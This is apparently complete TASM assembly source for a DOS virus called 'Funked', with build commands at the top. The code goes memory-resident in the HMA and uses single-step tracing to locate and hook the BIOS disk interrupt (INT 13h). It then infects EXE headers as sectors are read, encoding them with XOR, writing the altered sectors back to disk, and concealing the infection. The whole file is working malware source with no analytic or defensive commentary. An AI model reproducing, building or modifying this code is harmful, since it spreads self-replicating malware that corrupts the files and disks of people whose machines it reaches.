cseg            segment para    public  'code'
funked          proc    near
assume          cs:cseg


;tasm funked /m1        
;tlink funked /t


.186


ABORT           equ     002h
ALLOCATE_HMA    equ     04a02h
CLOSE_HANDLE    equ     03e00h
COMMAND_LINE    equ     080h
COM_OFFSET      equ     00100h
CRITICAL_INT    equ     024h
DENY_NONE       equ     040h
DEBUG_INT       equ     003h
DONT_SET_OFFSET equ     006h
DONT_SET_TIME   equ     040h
DOS_INT         equ     021h
DOS_SET_INT     equ     02500h
ENVIRONMENT     equ     02ah
EXEC_PROGRAM    equ     04b00h
EXE_SECTOR_SIZE equ     004h
EXE_SIGNATURE   equ     'ZM'
FAR_INDEX_CALL  equ     01effh
FIRST_FCB       equ     05ch
FLUSH_BUFFERS   equ     00d00h
FOUR_BYTES      equ     004h
FUNKED_CODE_AT  equ     00157h
GET_ERROR_LEVEL equ     04d00h
HARD_DISK_ONE   equ     081h
HIGH_BYTE       equ     00100h
INT_13_VECTOR   equ     0004ch
JOB_FILE_TABLE  equ     01220h
KEEP_CF_INTACT  equ     002h
MAX_SECTORS     equ     078h
MULTIPLEX_INT   equ     02fh
NEW_EXE_HEADER  equ     00040h
NEW_EXE_OFFSET  equ     018h
ONLY_READ       equ     000h
ONLY_WRITE      equ     001h
ONE_BYTE        equ     001h
OPEN_W_HANDLE   equ     03d00h
PARAMETER_TABLE equ     001f1h
PRINT           equ     00900h
READ_A_SECTOR   equ     00201h
READ_W_HANDLE   equ     03f00h
REMOVE_NOP      equ     001h
RESIZE_MEMORY   equ     04a00h
ROM_SEGMENT     equ     0f000h
SECOND_FCB      equ     06ch
SECTOR_SIZE     equ     00200h
SETVER_SIZE     equ     018h
SHORT_JUMP      equ     0ebh
SINGLE_STEP     equ     00100h
SINGLE_STEP_INT equ     001h
SIX_BYTES       equ     006h
SIXTEEN_BYTES   equ     010h
SYS_FILE_TABLE  equ     01216h
TERMINATE_W_ERR equ     04c00h
THREE_BYTES     equ     003h
TWENTY_ONE      equ     015h
TWO_BYTES       equ     002h
VERIFY_2SECTORS equ     00402h
WRITE_A_SECTOR  equ     00301h
WRITE_W_HANDLE  equ     04000h
XOR_CODE        equ     (SHORT_JUMP XOR (low(EXE_SIGNATURE)))*HIGH_BYTE


bios_seg        segment at ROM_SEGMENT               
        org     00000h                  
old_int_13_addr LABEL   BYTE                    
bios_seg        ends


        org     COM_OFFSET              


com_code:       jmp     short alloc_memory
        push    bp
        push    cs
        pop     ds
        mov     ah,high(PRINT)
        mov     dx,offset message
        int     DOS_INT                 
        mov     ax,TERMINATE_W_ERR
        int     DOS_INT                 


message:        db      'Funked Version 1.00 ',??date,' ',??time,'$'

        
        org     FUNKED_CODE_AT


decode          proc    near
        add     ax,word ptr ds:[si]
        xor     byte ptr ds:[si+alloc_memory-com_code-ONE_BYTE],ah

        
        org     high(EXE_SIGNATURE)+TWO_BYTES+COM_OFFSET


start_decode:   int     DEBUG_INT
        inc     si
        jns     decode
decode          endp
        

alloc_memory    proc    near                    
        les     di,dword ptr ds:[bx+ENVIRONMENT]
        push    es                      
        mov     ax,ALLOCATE_HMA         
        mov     bh,high(SECTOR_SIZE*2)  
        int     MULTIPLEX_INT           
        inc     di                      
        mov     bx,SIX_BYTES
        jz      find_name               
alloc_memory    endp                            


move_to_hma     proc    near                
        call    ax_cx_si_cld            
        rep     movsb                   
        call    set_int_13
move_to_hma     endp


find_name       proc    near                    
        pop     ds                      
look_for_nulls: inc     bx                      
        xor     word ptr ds:[bx+di-FOUR_BYTES],di
        jnz     look_for_nulls          
find_name       endp                            


open_file       proc    near                    
        mov     ah,high(FLUSH_BUFFERS)
        int     DOS_INT                 
        push    bx                      
        xchg    ax,cx
        push    ds                      
        mov     ax,OPEN_W_HANDLE+DENY_NONE+ONLY_READ
        lea     dx,word ptr ds:[bx]     
        int     DOS_INT
        push    cs
        xchg    ax,bx
        mov     ax,DOS_SET_INT+CRITICAL_INT
        mov     dx,offset critical_error
        pop     ds
        int     DOS_INT
        xchg    ax,dx
        mov     ah,high(READ_W_HANDLE)
        int     DOS_INT                 
        mov     ah,high(CLOSE_HANDLE)
        int     DOS_INT
        push    cs                      
        push    dx
        pop     bx                      
        pop     es                      
        call    convert_back            
        pop     ds                      
        pop     dx
        jne     now_run_it              
        push    dx                      
        mov     ax,OPEN_W_HANDLE+DENY_NONE+ONLY_READ
        push    ds
        int     DOS_INT
        push    cs
        pop     ds
        push    ax                      
        mov     bx,JOB_FILE_TABLE
        xchg    ax,bx
        int     MULTIPLEX_INT           
        mov     bl,byte ptr es:[di]
        mov     ax,SYS_FILE_TABLE
        int     MULTIPLEX_INT           
        mov     ax,WRITE_W_HANDLE+DENY_NONE+ONLY_WRITE
        mov     ch,high(SECTOR_SIZE)
        cmpsw                           
        mov     dx,DOS_SET_INT+CRITICAL_INT
        stosb                          
        pop     bx                      
        int     DOS_INT                 
        or      byte ptr es:[di+DONT_SET_OFFSET-THREE_BYTES],DONT_SET_TIME
        mov     ah,high(CLOSE_HANDLE)
        int     DOS_INT          
        pop     ds                      
        pop     dx
open_file       endp


now_run_it      proc    near                    
        mov     ah,high(RESIZE_MEMORY)
        push    cs                      
        mov     bx,offset exec_table
        pop     es                      
        int     DOS_INT                 
        mov     si,DOS_SET_INT+CRITICAL_INT+PARAMETER_TABLE
        lea     di,word ptr ds:[si]     
        xchg    si,bx                   
set_table:      mov     ax,EXEC_PROGRAM         
        scasw                           
        movs    byte ptr es:[di],es:[si]
        scasb                           
        mov     word ptr es:[di],es     
        je      set_table               
        int     DOS_INT                 
done:           mov     ah,high(GET_ERROR_LEVEL)
        int     DOS_INT                 
        mov     ah,high(TERMINATE_W_ERR)
        int     DOS_INT
now_run_it      endp                            


ax_cx_di_si_cld proc    near                    
        lea     di,word ptr ds:[bx+FUNKED_CODE_AT-COM_OFFSET]
ax_cx_si_cld:   call    set_si                  
set_si:         cld                             
        pop     ax                      
        sub     ax,set_si-decode
        xor     si,si
        xchg    ax,si
        mov     ah,high(XOR_CODE)       
        mov     cx,COM_OFFSET+SECTOR_SIZE-FUNKED_CODE_AT                
        ret
ax_cx_di_si_cld endp


set_int_13      proc    near                    
        push    cx
        pop     ds                      
        xchg    di,cx                   
        push    word ptr ds:[bx+di]     
        lea     si,ds:[si+bx-SIX_BYTES-(exe_starts_here-interrupt_one)]
        org     $-REMOVE_NOP
        mov     word ptr ds:[bx+di],cs  
        xchg    word ptr ds:[bx+di-TWO_BYTES],si
        mov     dl,HARD_DISK_ONE        
        push    si                      
        pushf                           
        mov     ax,VERIFY_2SECTORS      
        int     SINGLE_STEP_INT         
push_then_call: pushf                           
        dw      FAR_INDEX_CALL,INT_13_VECTOR
        popf                            
        pop     word ptr ds:[bx+di-TWO_BYTES]
        pop     word ptr ds:[bx+di]     
set_int_13      endp                            


convert_to      proc    near                    
        pusha                           
        stc                             
        mov     dx,EXE_SIGNATURE        
        pushf                           
        xor     dx,word ptr ds:[bx]     
        jnz     not_exe_header          
        cmp     word ptr ds:[bx+EXE_SECTOR_SIZE],MAX_SECTORS          
        ja      not_exe_header          
        cmp     word ptr ds:[bx+EXE_SECTOR_SIZE],SETVER_SIZE          
        je      not_exe_header          
        cmp     word ptr ds:[bx+NEW_EXE_OFFSET],NEW_EXE_HEADER
        jae     not_exe_header          
        call    ax_cx_di_si_cld         
        pusha                           
        repe    scasb                   
        popa                            
        jne     not_exe_header          
        xor     byte ptr ds:[bx],ah
        rep     movs byte ptr es:[di],cs:[si]
        lea     di,word ptr ds:[si+FOUR_BYTES]
        mov     si,bx
        mov     ch,high(SECTOR_SIZE/2)
        pusha
        push    es
        push    cs
        pop     es
        rep     movsw
        pop     es
        popa
        mov     cl,low(SECTOR_SIZE-(alloc_memory-com_code))
encode_sector:  cmpsb
        add     dx,word ptr cs:[di]
        xor     byte ptr ds:[si+alloc_memory-com_code-ONE_BYTE],dh
        loop    encode_sector
        popf                            
        clc                             
        pushf                           
not_exe_header: popf                            
        popa                            
not_funked:     ret                             
convert_to      endp


convert_back    proc    near                    
        call    ax_cx_di_si_cld         
        mov     cx,alloc_memory-decode
        repe    cmps byte ptr cs:[si],es:[di]
        jne     not_funked                
        xor     byte ptr ds:[bx],ah
        call    ax_cx_di_si_cld         
        rep     stosb                   
        ret                             
convert_back    endp                    


interrupt_one   proc    far                     
        cmp     ax,VERIFY_2SECTORS      
        jne     interrupt_ret           
        pusha                           
        push    sp
        pop     bp                      
        push    ds                      
        lds     si,dword ptr ss:[bp+SIXTEEN_BYTES]
        cmp     word ptr ds:[si+ONE_BYTE],FAR_INDEX_CALL
        jne     go_back                 
        cmp     si,offset push_then_call
        mov     si,word ptr ds:[si+THREE_BYTES]
        je      toggle_tf               
        cmp     byte ptr ds:[si+THREE_BYTES],high(ROM_SEGMENT)
        jb      go_back                 
        cld                             
        xchg    di,cx                   
        movsw                           
        std                             
        movsw                           
        sub     di,bx                   
        mov     word ptr ds:[si],di     
        mov     word ptr ds:[si+TWO_BYTES],es
toggle_tf:      xor     byte ptr ss:[bp+TWENTY_ONE],high(SINGLE_STEP)
go_back:        pop     ds                      
        popa                            
critical_error: mov     al,ABORT                
interrupt_ret:  iret                            
interrupt_one   endp                            


exec_table      db      COMMAND_LINE,FIRST_FCB,SECOND_FCB


interrupt_13    proc    far                     
compare_verify: cmp     ah,high(VERIFY_2SECTORS)
        ja      call_old_int_13         
        push    ds                      
        push    es                      
        pop     ds
        call    convert_to              
        pushf                           
        push    cs                      
        call    call_old_int_13         
        pushf                           
        call    convert_to              
        pusha                           
        jc      do_convertback          
        pushf                           
        push    cs                      
        mov     ax,WRITE_A_SECTOR
        call    call_old_int_13         
do_convertback: call    convert_back            
        popa                            
        popf                            
        pop     ds
        retf    KEEP_CF_INTACT          
interrupt_13    endp


        db      'Q'

        
        org     COM_OFFSET+SECTOR_SIZE-SIX_BYTES


int_13_entry    proc    near
        cmp     ah,high(READ_A_SECTOR)  
        jae     compare_verify          
int_13_entry    endp


        org     COM_OFFSET+SECTOR_SIZE-ONE_BYTE


call_old_int_13 proc    near                    
        jmp     far ptr old_int_13_addr
call_old_int_13 endp


        org     COM_OFFSET+SECTOR_SIZE


exe_starts_here LABEL   BYTE


funked          endp                            
cseg            ends
end             com_code
